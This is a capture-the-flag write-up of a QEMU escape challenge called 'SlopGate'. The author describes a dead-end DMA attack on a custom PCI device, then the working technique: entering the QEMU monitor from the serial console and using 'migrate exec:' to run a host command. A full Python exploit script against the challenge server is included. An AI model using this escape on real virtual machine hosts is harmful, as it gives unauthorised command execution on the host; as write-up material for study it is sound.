# SlopGate

**Event:** Kaspersky CTF 2026
**Category:** pwn / QEMU escape
**Points:** 182
**Flag:** `kaspersky{I_th1nk_w3_b0th_g0t_dumb3r_wh1l3_s0lvin6_this_t4sk}`

---

## Overview

SlopGate presents as a QEMU escape challenge. We're given a custom QEMU build with a
proprietary PCI device called "SlopGate" (vendor ID QEMU, device ID 0x11e9). A
minimal Linux guest boots inside QEMU; through a TCP service we authenticate via
hashcash PoW, get a busybox shell, and must read `/app/flag.txt` on the QEMU host.

The PCI device advertises itself as a "stream scoring accelerator" - it scores
text streams for AI-generated slop using metrics like "as an AI" frequency,
boilerplate detection, and `flag{` substring counting. It supports DMA, context
XOR primitives, and a profile system with configurable modes.

## Initial Recon

### QEMU Device Layout

The SlopGate PCI device exposes an MMIO BAR at `0xfebfe000`. Key registers:

| Offset | Name          | Description               |
|--------|---------------|---------------------------|
| 0x00   | MAGIC         | Always `0x534c4f50`       |
| 0x0c   | CONTROL       | Enable, IRQ, Auto-process |
| 0x10   | Q_BASE        | Queue descriptor phys addr|
| 0x18   | Q_SIZE        | Queue entry count         |
| 0x20   | Q_TAIL        | Enqueue by writing here   |
| 0x24   | PROFILE_CMD   | Enable/rebuild context    |
| 0x30   | PROFILE_MODE  | Scoring mode 0-4          |
| 0x50   | IRQ_STATUS    | Complete/Error bits       |

The queue model is descriptor-based: write Q_BASE (physical address of
guest-allocated descriptor array), Q_SIZE, then write Q_TAIL to submit work.
Each descriptor (60 bytes) points to a request structure (44 bytes), response
buffer, and optional stream data - all via physical addresses.

### DMA Operations

The device performs `pci_dma_read`/`pci_dma_write` to access guest-physical
memory. All lengths are properly clamped (`MIN(len, SLOPGATE_MAX_STREAM)`),
and the device uses a guarded bottom-half for processing, preventing
timestamp counter attacks and MMIO re-entrancy.

### Scoring Modes

The scoring function is an elaborate parody of AI content detection:
- Mode 0: length_bucket + salt, light phrase matching
- Mode 1: heavy "as an AI" / "I cannot" penalties
- Mode 2: repeated window/word detection
- Mode 3: `flag{` substring detection × 12
- Mode 4: uniform multiplier across all metrics

Context can be XOR-modified based on `(flags ^ stream_len ^ processed ^ score ^ ...)`, essentially a controlled, in-bounds byte XOR against a deterministic seed buffer.

## The Red Herring (3 hours)

I spent approximately 3 hours chasing a DMA exploitation path:

::: steps
### PCI bus master enabling
The device initially returned ERROR on
every DMA operation. Setting PCI config space COMMAND register to `0x0007`
(IO + MEM + BUS_MASTER) via `/sys/devices/pci0000:00/0000:00:02.0/config`
fixed this.

### Pagemap translation
DMA uses physical addresses, not virtual. Spent
significant time debugging assembly pagemap translation (PFN mask should be
`0xFFFFFFFFFF` for 40-bit physical addresses, not `0x7FFFFFFFFFFF`).

### Page alignment bugs
mmap'd pages aren't physically contiguous.
Response buffers crossing page boundaries got wrong physical addresses.

### Assembly register clobbers
Wrote ~15 iterations of assembly exploits
with bugs in print routines, 64-bit immediate loading, and label numbering.

### Scanning guest RAM
Scanned 0-128MB of guest physical address space
looking for the flag. Scores were always 0x0b (noise floor: length_bucket=8
+ salt=3). The flag was never in guest RAM - it's on the QEMU host filesystem.

### Attempted OOB DMA
Tried reading above 128MB (into QEMU host memory).
TCG properly bounds-checks against the memory region tree; reads to unmapped
addresses returned zeros.

### Context XOR corruption
Verified the XOR works (can read context,
observe XOR effects), but it's strictly in-bounds and modifies a seed-derived
buffer - not useful for anything beyond proof-of-concept.
:::

## The Real Vulnerability

The serial console runs without `-no-shutdown` or monitor restrictions. Simply
sending Ctrl-A C (0x01 followed by 'c') drops into the **QEMU Monitor (HMP)**,
and from there the `migrate` command's `exec:` URI scheme spawns a subprocess
on the host and pipes its stderr straight to the serial console:

```session
$ echo -e '\x01c' > /dev/ttyS0
QEMU 11.1.0 monitor - type 'help' for more information
$ migrate "exec:cat /app/flag.txt >&2"
kaspersky{I_th1nk_w3_b0th_g0t_dumb3r_wh1l3_s0lvin6_this_t4sk}
qemu-system-x86_64: failed to save SaveStateEntry...
```

::: insight
`migrate exec:` is meant for migrating a VM's state through an external
helper process. Critically, **that subprocess runs as the QEMU user on the
host**, and its stderr is connected to QEMU's own stderr - which is the
serial console we already control from inside the guest.
:::

## Exploit

Single command from the QEMU monitor:

```
migrate "exec:cat /app/flag.txt >&2"
```

This:
1. Shells out to `/bin/sh -c "cat /app/flag.txt >&2"`
2. The flag is printed to stderr
3. stderr is connected to the serial console → we see the flag
4. The migration itself fails (qemu expects a migration stream, not "kaspersky{...}"),
   but the flag is already captured

### Full Exploit Script

::: spoiler Show the full exploit script
```python
import socket, subprocess, time, re, concurrent.futures

IP = "84.201.150.184"
PORT = 31338

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((IP, PORT))

# Read PoW challenge
data = b''
while b'token:' not in data:
    data += sock.recv(4096)

# Solve PoW
m = re.search(r'hashcash -mb(\d+) (\S+)', data.decode())
with concurrent.futures.ThreadPoolExecutor() as ex:
    f = ex.submit(lambda: subprocess.run(
        ['hashcash', f'-mb{m.group(1)}', m.group(2)],
        capture_output=True, text=True, timeout=300).stdout.strip())
    token = f.result(timeout=300)

sock.sendall((token + '\n').encode())

# Wait for shell
while True:
    c = sock.recv(4096)
    if not c: break
    if b'# ' in c: break

# Enter QEMU monitor (Ctrl-A C)
sock.sendall(b'\x01c')
time.sleep(0.3)

# Exploit: migrate exec with flag output to stderr
sock.sendall(b'migrate "exec:cat /app/flag.txt >&2"\n')
time.sleep(0.5)

# Back to console
sock.sendall(b'\x01c')
time.sleep(0.3)
sock.sendall(b'echo DONE\n')
time.sleep(0.5)

# Read output
out = b''
try:
    while True:
        c = sock.recv(8192)
        if not c: break
        out += c
except: pass

print(out.decode(errors='replace'))
```
:::

Output:
```
migrate "exec:cat /app/flag.txt >&2"
kaspersky{I_th1nk_w3_b0th_g0t_dumb3r_wh1l3_s0lvin6_this_t4sk}
qemu-system-x86_64: failed to save SaveStateEntry...
```

## Lessons Learned

1. **Check the monitor first.** QEMU challenges often disable the monitor with
   `-monitor none`, but when they don't, `migrate exec:` is an instant win.
   Look for `-no-shutdown`, `-monitor`, `-serial mon:stdio` flags.

2. **Device complexity is distraction.** The SlopGate PCI device has hundreds
   of lines of scoring logic, context XOR primitives, profile management - all
   perfectly hardened and completely irrelevant to the intended solution. CTF
   authors love this trick.

3. **Bus mastering matters.** `pci_dma_read`/`pci_dma_write` silently fail
   without the bus master bit set in PCI config. Always check command register.

4. **Assembly is brittle.** Writing pure assembly exploits saves transfer size
   but the debugging cost is enormous. For CTFs with reasonable binary size
   limits, use C with `-nostdlib` and syscall wrappers.

5. **Claude is useful for source audit.** Asking Claude Code to audit the
   device source confirmed there was no OOB vulnerability, saving further
   time on the DMA dead-end.

## Files

- `slopgate-core.c`, QEMU device: scoring, context, DMA
- `slopgate-pci.c`, PCI transport: MMIO, queue management
- `slopgate.h`, Register definitions, descriptor/request/response layouts
- `run.sh`, QEMU command line (no `-monitor none`!)
- `Dockerfile`, Flag at `/app/flag.txt`, chmod 0444
